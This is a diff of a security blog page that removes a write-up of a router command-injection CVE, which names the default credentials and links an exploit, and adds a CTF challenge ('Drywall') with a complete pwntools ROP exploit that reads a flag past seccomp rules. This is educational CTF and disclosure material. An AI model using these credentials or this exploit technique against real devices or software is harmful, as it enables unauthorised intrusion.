@@ -15,33 +15,17 @@
       <div class="flex-auto bg-mantle"></div>
       <div class="flex-none p-4">
         <article class="max-w-[90ch] leading-relaxed [&amp;>p]:p-2 break-words">
-          <p>tldr; I found this command injection vulnerability and registered it as <span class="text-blue"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33617">CVE-2023-33617</a></span></p>
-          <p>This <span class="text-blue"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33617">CVE</a></span> is an Authenticated Command Injection vulnerability. It affects Parks Fiberlink 210 routers, in the firmware version <span class="text-peach bg-mantle p-1 rounded-md"><code>V2.1.14_X000</code></span> .</p>
-          <p>This vulnerability has already been fixed in the version <span class="text-peach bg-mantle p-1 rounded-md"><code>V2.1.15_X000</code></span> , but there are several vulnerable routers on the Internet.</p>
-          <img class="max-w-xl block rounded-md p-4 mx-auto" src="/static/CVE-2023-33617-shodan-00.jpg">
-          <p>Parks is a Brazillian company that sells devices for enterprise, they seem to be the only ones who sell this router.</p>
-          <p>I've written an exploit in Python, [here it is]( <span class="text-blue"><a href="https://gist.github.com/gbrls/58a5032bc58510abb908386124d1b4d2">https://gist.github.com/gbrls/58a5032bc58510abb908386124d1b4d2</a></span> ). It leverages the default credentials, which are <span class="text-peach bg-mantle p-1 rounded-md"><code>admin:parks</code></span> , and checks if the version is vulnerable.</p>
-          <p>If you have access to a router and want to manually check if you're vulnerable, check the "Software Version".</p>
-          <img class="max-w-xl block rounded-md p-4 mx-auto" src="/static/CVE-2023-33617-01.jpg">
           <div class="text-mauve text-3xl p-8">
-            <h2>Hacking IoT devices is fun</h2>
+            <h2>Drywall</h2>
           </div>
-          <p>If you were here only for the technical details, that was it. Here I'll write like I usually do in my other blogs and explain the story of how I found this vulnerabiliy.</p>
-          <p>Desktops nowdays have had their security significantly improved over the years, to the point that the Anti Virus that comes out of the box in Windows is not even bad. But have you ever heard about a router running an Antivirus? Have you ever seem a router be updated? Yeah, and guess what, routers are in a very good position in a network, they're taken for granted and often have their security overlooked.</p>
-          <p>The thing that happens in routers that makes them specially vulnerable is that:</p>
-          <ul>
-            <li>They usually have a WAN and LAN interface.</li>
-            <li>Vendors often use the same admin credentials for all the devices they ship.</li>
-            <li>Exposing your router's admin page to the Internet is as easy as changing the listening interface from <span class="text-peach bg-mantle p-1 rounded-md"><code>127.0.0.1</code></span> to <span class="text-peach bg-mantle p-1 rounded-md"><code>0.0.0.0</code></span> .</li>
-          </ul>
-          <p>Once you have access to one of those devices, there are multiple ways to go from admin to root. Routers are a good target for exploitation so there are many public CVEs. But if you don't find any exploitable CVE, there are two ways to go from there:</p>
-          <ul>
-            <li>Reversing firmware patches from the router itself and it's software dependencies. <em>(This is how we look for non-public vulnerabilities)</em></li>
-            <li>Looking for 0-days.</li>
-          </ul>
-          <p>The approach that I like to use to find new vulnerabilities is to look for critical functionalities or dangerous funcionalities. e.g. The vulnerability for this CVE comes from the ping funcionality in the router, it takes user input and sends it to the ping command, this smells of command injection, and this is what I follow, the smell.</p>
-          <img class="max-w-xl block rounded-md p-4 mx-auto" src="/static/CVE-2023-33617-00.jpg">
-          <p>That's it, Happy Hacking!</p>
+          <div class="text-mauve text-3xl p-8">
+            <h2>challenge source</h2>
+          </div>
+          <pre>#include &lt;seccomp.h><br>#include &lt;stdio.h><br>#include &lt;stdlib.h><br><br>typedef void * scmp_filter_ctx;<br><br>static char name[30];<br><br>void gift(){<br>    asm ("pop %rdx; ret;");<br>    asm ("pop %rax; ret;");<br>    asm ("syscall; ret;");<br>}<br><br>int main(){<br>    setvbuf(stdout, NULL, _IONBF, 0);<br>    setvbuf(stderr, NULL, _IONBF, 0);<br>    setvbuf(stdin, NULL, _IONBF, 0);<br><br>    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);<br><br><br><br>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),0);<br>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open),0);<br>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat),0);<br>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(readv),0);<br>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(writev),0);<br>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(process_vm_readv),0);<br>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(process_vm_writev),0);<br><br><br>    seccomp_load(ctx);<br><br>    char buf[256];<br>    puts("What is your name, epic H4x0r?");<br>    fgets(name, 30, stdin);<br><br>    printf("Good luck %s &lt;|;)\n", name);<br>    printf("%p\n",main);<br>    fgets(buf, 0x256, stdin);<br><br>    return 0;<br>}</pre>
+          <div class="text-mauve text-3xl p-8">
+            <h2>solution</h2>
+          </div>
+          <pre>from pwn import *<br><br>context.update(arch='amd64', os='linux')<br><br>#b *(main+378)<br>#io = gdb.debug('./drywall', '''<br>#b *(main+471)<br>#c<br>#               ''')<br><br>#io = process('./drywall')<br>io = remote('drywall.kctf-453514-codelab.kctf.cloud', 1337)<br><br>io.send(b'.//./././././././././flag.txt')<br><br>io.readline()<br>io.readline()<br>io.readline()<br><br>base = int(io.readline(), 16) - 419<br>print('base: ', hex(base))<br><br>pop_rdi = base+0x3db<br>pop_rax = base+0x19b<br>pop_rdx = base+0x199<br>pop_rsi_pop_r15 = base+0x3d9<br>syscall = base+413<br><br>flag = base+0x3050<br><br>p = b''<br><br># openat(AT_FDCWD, "flag.txt", O_RDONLY)<br>p += p64(pop_rdi)<br>p += p64(0xffffff9c)          # AT_FDCWD (-100)<br>p += p64(pop_rsi_pop_r15)<br>p += p64(flag)           # Pointer to "flag.txt"<br>p += p64(0xdeadbeef)          # R15 garbage<br>p += p64(pop_rdx)<br>p += p64(0)                   # O_RDONLY<br>p += p64(pop_rax)<br>p += p64(257)                 # openat syscall number<br>p += p64(syscall)<br><br># read(fd, flag, 100)<br>p += p64(pop_rax)<br>p += p64(0)                   # read syscall<br>p += p64(pop_rdi)<br>p += p64(3)                   # Assume fd=3 (first opened file)<br>p += p64(pop_rsi_pop_r15)<br>p += p64(flag)           # Read into same buffer<br>p += p64(0xdeadbeef)          # R15 garbage<br>p += p64(pop_rdx)<br>p += p64(100)                 # Read 100 bytes<br>p += p64(syscall)<br><br># write(fd=1, flag, bytes_read)<br>p += p64(pop_rax)<br>p += p64(1)                   # write syscall<br>p += p64(pop_rdi)<br>p += p64(1)                   # stdout<br>p += p64(pop_rsi_pop_r15)<br>p += p64(flag)<br>p += p64(0xdeadbeef)<br>p += p64(pop_rdx)<br>p += p64(100)<br>p += p64(syscall)<br><br>io.sendline(cyclic(280) + p)<br>io.interactive()</pre>
         </article>
         <div class="mt-4 mb-4"><svg style="overflow: visible;" class="typst-doc" viewBox="0 0 297.6377952755906 2.8346456692913384" width="297.6377952755906pt" height="2.8346456692913384pt" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:h5="http://www.w3.org/1999/xhtml">
     <g>
